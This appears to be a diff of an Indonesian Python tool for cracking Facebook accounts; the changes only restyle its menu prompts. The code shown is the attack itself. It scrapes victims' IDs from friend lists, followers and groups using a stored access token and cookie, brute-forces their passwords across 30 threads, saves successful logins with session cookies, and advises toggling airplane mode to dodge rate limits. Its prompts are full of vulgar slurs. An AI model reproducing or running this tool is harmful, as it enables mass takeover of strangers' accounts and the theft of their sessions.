@@ -146,13 +146,13 @@ def banner():
 	print(f'''\t{asu}         
 ╭─────────────────────────────────────────────────────╮
 │╭───────────────────────────────────────────────────╮│ 
-││   cetak(nel('\t
+││   
 ││     ███████╗░█████╗░██╗███████╗░█████╗░██╗░░░░░
 ││     ██╔════╝██╔══██╗██║╚════██║██╔══██╗██║░░░░░
 ││     █████╗░░███████║██║░░███╔═╝███████║██║░░░░░
 ││     ██╔══╝░░██╔══██║██║██╔══╝░░██╔══██║██║░░░░░
 ││     ██║░░░░░██║░░██║██║███████╗██║░░██║███████╗
-││     ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝╚══════╝    ))              
+││     ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝╚══════╝                  
 │╰───────────────────────────────────────────────────╯│
 ╰─────────────────────────────────────────────────────╯
 ││{m}•{k}•{h}•{sir} Author : Faizal N-A {x}{m}•{k}•{h}•{x}       ││
@@ -214,17 +214,17 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	gh = 'github.com/MEMEK'
 	cetak(nel('\tSelamat Datang [yellow]%s[white] Ngentod'%(my_name)))
-	print(f'>> Your Idz : '+str(my_id))
-	print(f'>> Your Ip  : {ip}')
-	print(f'>> Github   : {gh}')
+	print(f'⚡ Your Idz : '+str(my_id))
+	print(f'⚡ Your Ip  : {ip}')
+	print(f'⚡ Github   : {gh}')
 	print('')
-	print('>> 1. Crack Publik ')
-	print('>> 2. Crack Follower ')
-	print('>> 3. Crack Grup   ')
-	print('>> 4. Crack File	')
-	print('>> 5. Hasil Crack  ')
-	print('>> 0. Keluar       ')
-	_____FAIZAL_____ = input('\n>> Pilih : ')
+	print('⚡ 1. Crack Publik ')
+	print('⚡ 2. Crack Follower ')
+	print('⚡ 3. Crack Grup   ')
+	print('⚡ 4. Crack File	')
+	print('⚡ 5. Hasil Crack  ')
+	print('⚡ 0. Keluar       ')
+	_____FAIZAL_____ = input('\n⚡ Pilih : ')
 	if _____FAIZAL_____ in ['1']:
 		dump_massal()
 	elif _____FAIZAL_____ in ['2']:
@@ -238,29 +238,29 @@ def menu(my_name,my_id):
 	elif _____FAIZAL_____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print('>> Sukses Logout+Hapus Kukis ')
+		print('⚡ Sukses Logout+Hapus Kukis ')
 		exit()
 	else:
-		print('>> Pilih sing Bener Asu ')
+		print('⚡ Pilih sing Bener Asu ')
 		back()
 def error():
-	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
+	print(f'{k}⚡ Maaf Fitur Ini Masih Di Perbaiki {x}')
 	time.sleep(4)
 	back()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	print(f'>> 1. Hasil {h}OK{x} Anda ')
-	print(f'>> 2. Hasil {k}CP{x} Anda ')
-	print('>> 3. Kembali	')
-	kz = input(f'\n>> Pilih : ')
+	print(f'⚡ 1. Hasil {h}OK{x} Anda ')
+	print(f'⚡ 2. Hasil {k}CP{x} Anda ')
+	print('⚡ 3. Kembali	')
+	kz = input(f'\n⚡ Pilih : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print('>> File Tidak Di Temukan ')
+			print('⚡ File Tidak Di Temukan ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print('>> Anda Tidak Memiliki Hasil CP ')
+			print('⚡ Anda Tidak Memiliki Hasil CP ')
 			time.sleep(2)
 			back()
 		else:
@@ -274,24 +274,24 @@ def result():
 					nom = ''+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
+					print(f'⚡ %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n>> Pilih : ')
+			geeh = input('\n⚡ Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Sing Bener Koplok ')
+				print('⚡ Pilih Sing Bener Koplok ')
 				back()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print('>> File Tidak Di Temukan ')
+				print('⚡ File Tidak Di Temukan ')
 				time.sleep(2)
 				back()
 			nocp=0
 			for cpku in range(len(lin)):
 				cpkuni=lin[nocp].split('|')
-				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
+				print(f'{x}⚡ {k}{cpkuni[0]}|{cpkuni[1]}')
 				nocp +=1
 			print('')
 			input(f'{x}[{m} Klik Enter{x} ]')
@@ -299,11 +299,11 @@ def result():
 	elif kz in ['1']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print('>> File Tidak Di Temukan ')
+			print('⚡ File Tidak Di Temukan ')
 			time.sleep(2)
 			back()
 		if len(vin)==0:
-			print('>> Anda Tidak Mempunyai File OK ')
+			print('⚡ Anda Tidak Mempunyai File OK ')
 			time.sleep(2)
 			back()
 		else:
@@ -317,25 +317,25 @@ def result():
 					nom = '0'+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
+					print(f'⚡ %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
 				else:
 					lol.update({str(cih):str(isi)})
-					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
+					print(f'⚡ %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
 			geeh = input(f'\nPilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Sing Bener Belegug ')
+				print('⚡ Pilih Sing Bener Belegug ')
 				back()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print('>> File Tidak Di Temukan ')
+				print('⚡ File Tidak Di Temukan ')
 				time.sleep(2)
 				back()
 			nocp=0
 			for cpku in range(len(lin)):
 				cpkuni=lin[nocp].split('|')
 				print('')
-				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
+				print(f'{x}⚡ {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
 				nocp +=1
 			print('')
 			input(f'{x}[{m} Klik Enter{x} ]')
@@ -343,7 +343,7 @@ def result():
 	elif kz in ['3']:
 		back()
 	else:
-		print('>> Pilih sing Bener Belegug ')
+		print('⚡ Pilih sing Bener Belegug ')
 		back()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
@@ -353,18 +353,18 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('>> Sabaraha Target Njing ? : '))
+		jum = int(input('⚡ Sabaraha Target Njing ? : '))
 	except ValueError:
-		print('>> Masukkan Angka Anjing, Tong Huruff ')
+		print('⚡ Masukkan Angka Anjing, Tong Huruff ')
 		exit()
 	if jum<1 or jum>100:
-		print('>> Gagal Dump Idz ')
+		print('⚡ Gagal Dump Idz ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
+		kl = input('⚡ Masukkan Idz Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -378,18 +378,18 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print('>> Sinyal Loh Kek Kontoll ')
+			print('⚡ Sinyal Loh Kek Kontoll ')
 			exit()
 	try:
 		print('')
-		print(f'>> Total Idz Teman Crot Terkumpul🔥{h}'+str(len(id)))
+		print(f'⚡ Total Idz Teman Crot Terkumpul🔥{h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print('>> Sinyal Kontol ')
+		print('⚡ Sinyal Kontol ')
 		back()
 	except (KeyError,IOError):
-		print(f'>>{k} Pertemanan Tidak Public {x}')
+		print(f'⚡{k} Pertemanan Tidak Public {x}')
 		time.sleep(3)
 		back()
 #-------------------[ CRACK-PENGIKUT ]----------------#
@@ -399,33 +399,33 @@ def dump_pengikut():
 		cok = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
-	pil = input('>> Masukkan Idz Target : ')
+	print('⚡ Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
+	pil = input('⚡ Masukkan Idz Target : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(f'>> Total Idz :{h} '+str(len(id)))
+		print(f'⚡ Total Idz :{h} '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print('>> Koneksi Internet Bermasalah ')
+		print('⚡ Koneksi Internet Bermasalah ')
 		exit()
 	except (KeyError,IOError):
-		print('>> Gagal Mengambil Target ')
+		print('⚡ Gagal Mengambil Target ')
 		exit()
 #------------------[ CRACK-GRUP ]-----------------#
 balmond = b+"["+h+"✓"+b+"]"
 
 def lah():
-	print(f'\n{x}>> Total Idz Yang Terkumpul :{h} %s '%(len(id)))
-	input(f'{x}>> [ {m}Klik Enter {x}] ')
+	print(f'\n{x}⚡ Total Idz Yang Terkumpul :{h} %s '%(len(id)))
+	input(f'{x}⚡ [ {m}Klik Enter {x}] ')
 	print('')
 	pass
 	setting()
 def grup():
 	print('')
-	id = input(f'{x}>> Masukkan Username Atau Idz Grup : ')
+	id = input(f'{x}⚡ Masukkan Username Atau Idz Grup : ')
 	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
 	miskinlu = {"user-agent": ua}
 	url = "https://mbasic.facebook.com/groups/"+id
@@ -433,7 +433,7 @@ def grup():
 	try:
 		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
 	except requests.exceptions.ConnectionError:
-		print('>> Sinyal Loo Kek Kontol ')
+		print('⚡ Sinyal Loo Kek Kontol ')
 		time.sleep(0.5)
 		exit()
 	berr = gn.find("title")
@@ -443,11 +443,11 @@ def grup():
 		time.sleep(0.5)
 		grup()
 	elif berr2=='Kesalahan':
-		alvino_xy('>> Grup Tidak Di Temukan ')
+		alvino_xy('⚡ Grup Tidak Di Temukan ')
 		time.sleep(0.5)
 		grup()
 	else:pass
-	print(f'{x}>> Nama Grup : {b}%s'%(berr2))
+	print(f'{x}⚡ Nama Grup : {b}%s'%(berr2))
 	ggs = gn.find_all('table')
 	ang = []
 	for ff in ggs:
@@ -461,13 +461,13 @@ def grup():
 	if len(ang)==0:
 		print(" Anggota : -")
 	else:
-		print(f'{x}>> Anggota : {h}%s'%(ang[0]))
+		print(f'{x}⚡ Anggota : {h}%s'%(ang[0]))
 	grup1(url)
 def grup1(urls):
 	use = []
 	ses = requests.Session()
-	print(f'{x}>> Sedang Mengumpulkan Idz ')
-	print(f'>> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
+	print(f'{x}⚡ Sedang Mengumpulkan Idz ')
+	print(f'⚡ Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
 	while True:
 		try:
 			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
@@ -531,15 +531,15 @@ def grup1(urls):
 def crack_file():
 	try:vin = os.listdir('/sdcard/ALVINO-DUMP')
 	except FileNotFoundError:
-		print('>> File Tidak Ditemukan ')
+		print('⚡ File Tidak Ditemukan ')
 		time.sleep(2)
 		back()
 	if len(vin)==0:
 		print('')
 		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
-		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
+		kontol = input('\n⚡ Apakah Anda Faham ( Y/t ) ')
 		if kontol in ['']:
-			print('>> Pilih Sing Bener Koplok ')
+			print('⚡ Pilih Sing Bener Koplok ')
 		elif kontol in ['y','Y']:
 			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
 			time.sleep(3)
@@ -548,7 +548,7 @@ def crack_file():
 			print(f'\n[{k}x{x}] Pilih Sing Bener Koplok ')
 			time.sleep(3)
 			exit()
-		print('>> Anda Tidak Memiliki File Dump ')
+		print('⚡ Anda Tidak Memiliki File Dump ')
 		time.sleep(2)
 		back()
 	else:
@@ -562,20 +562,20 @@ def crack_file():
 				nom = ''+str(cih)
 				lol.update({str(cih):str(isi)})
 				lol.update({nom:str(isi)})
-				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
+				print(f'⚡ %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
 			else:
 				lol.update({str(cih):str(isi)})
 				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
-		geeh = input('\n>> Pilih : ')
+				print('⚡ %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
+		geeh = input('\n⚡ Pilih : ')
 		try:geh = lol[geeh]
 		except KeyError:
-			print(f'{k}>> Pilih Sing Bener Koplok {x}')
+			print(f'{k}⚡ Pilih Sing Bener Koplok {x}')
 			time.sleep(3)
 			back()
 		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
 		except:
-			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
+			print('⚡ File Tidak Ditemukan, Coba Lagi Nanti ')
 			time.sleep(2)
 			back()
 		for xid in lin:
@@ -583,7 +583,7 @@ def crack_file():
 		setting()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	print(f'{x}>> 1. Akun Kolot ')
+	print(f'{x}⚡ 1. Akun Kolot ')
 	print('🔮 2. Akun Anyar ')
 	print('🔮 3. Acak akun ameh crot')
 	hu = input(' 💦 Pilih : ')
@@ -605,18 +605,18 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print('>> Pilih Sing Bener Koplok ')
+		print('⚡ Pilih Sing Bener Koplok ')
 		exit()
 	print('🔮 1. Mobile ')
 	print('🔮 2. Free ')
 	print('🔮 3. Touch  ')
 	print('🔮 4. Mbasic ')
 	print('')
-	hc = input('>> Pilih : ')
+	hc = input('⚡ Pilih : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
-		print('>> Pilih Sing Bener Koplok ')
+		print('⚡ Pilih Sing Bener Koplok ')
 		setting()
 	elif hc in ['2','02']:
 		method.append('free')
@@ -627,19 +627,19 @@ def setting():
 	else:
 		method.append('mobile')
 	print('')
-	_jembot_ = input('>> Tambahkan Aplikasi ( Y/t ) ')
+	_jembot_ = input('⚡ Tambahkan Aplikasi ( Y/t ) ')
 	if _jembot_ in ['']:
-		print('>> Pilih Sing Bener Koplok ')
+		print('⚡ Pilih Sing Bener Koplok ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+	pwplus=input('⚡ Tambahkan Password Manual ( Y/t ) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
-		pwku=input('>> Masukkan Password Tambahan : ')
+		pwku=input('⚡ Masukkan Password Tambahan : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -648,11 +648,11 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Mengejar Memek {m}•{k}•{h}•{x} <<<<< ')
+	print(f'⚡⚡> {m}•{k}•{h}•{x} Sedang Mengejar Memek {m}•{k}•{h}•{x} <<<<< ')
 	print('')
-	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'>> Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
+	print(f'⚡ Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
+	print(f'⚡ Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	print(f'⚡ Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -703,12 +703,12 @@ def passwrd():
 	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('')
-	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
-	woi = input('>> Pilih : ')
+	print('⚡ Lanjut Crack Kembali ( Y/t ) ? ')
+	woi = input('⚡ Pilih : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
+		print(f'\t{x}⚡{k} Good Bye Dadaahh{x} << ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-MOBILE-1 ]-----------------#
@@ -837,7 +837,7 @@ def crackfree(idf,pwv):
 	loop+=1
 
 #			if "checkpoint" in po.cookies.get_dict().keys():
-#				print(f'\r{K}>> {idf}|{pw}{N}')     
+#				print(f'\r{K}⚡ {idf}|{pw}{N}')     
 #				os.popen('play-audio .cp.mp3')
 #				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 #				akun.append(idf+'|'+pw)
@@ -847,7 +847,7 @@ def crackfree(idf,pwv):
 #				ok+=1
 #				coki=po.cookies.get_dict()
 #				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
+#				print(f'\r{H}⚡ {idf}|{pw}|{kuki}{N}')
 #				os.popen('play-audio .ok.mp3')
 #				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 #				cek_apk(session,coki)
@@ -1151,5 +1151,5 @@ if __name__=='__main__':
 	time.sleep(3)
 	login()
 
-#>>>>> THANKS TO THIS HERE <<<<<<<#
-#>>>>> Faizal N-A <<<<<#
+#⚡⚡> THANKS TO THIS HERE <<<<<<<#
+#⚡⚡> Faizal N-A <<<<<#
